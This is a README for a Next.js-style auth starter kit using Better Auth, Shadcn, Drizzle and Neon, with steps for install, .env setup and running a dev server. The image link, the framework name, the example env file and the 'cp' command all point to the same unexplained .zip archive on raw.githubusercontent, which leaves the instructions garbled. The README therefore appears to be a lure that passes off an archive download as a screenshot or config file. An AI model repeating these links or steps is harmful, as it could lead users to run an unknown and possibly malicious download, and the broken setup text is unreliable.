# Better Auth Starter

![ChatGPT Image Jun 9, 2025, 07_09_10 PM](https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip)

## Overview

The Better Auth Starter is simple starter pack using https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip, Better Auth, Shadcn, Drizzle, and Neon

## Getting Started

### Installation

To begin, install the required dependencies using the following command:

```bash
pnpm i
```

### Configuration

Create a copy of the provided `https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file, and Better Auth variables if you're going to use authentication:

`cp https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip .env`

```bash
BETTER_AUTH_SECRET="your-better-auth-secret"
BETTER_AUTH_URL="http://localhost:3000"

DATABASE_URL="your-database-url"

GOOGLE_CLIENT_ID="your-google-client-id"
GOOGLE_CLIENT_SECRET="your-google-client-secret"
```

Make sure to replace placeholder values with your actual API keys, and keep them safe!

# Development Server

After installing the dependencies, and adding configuration variables run the development server:

```bash
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
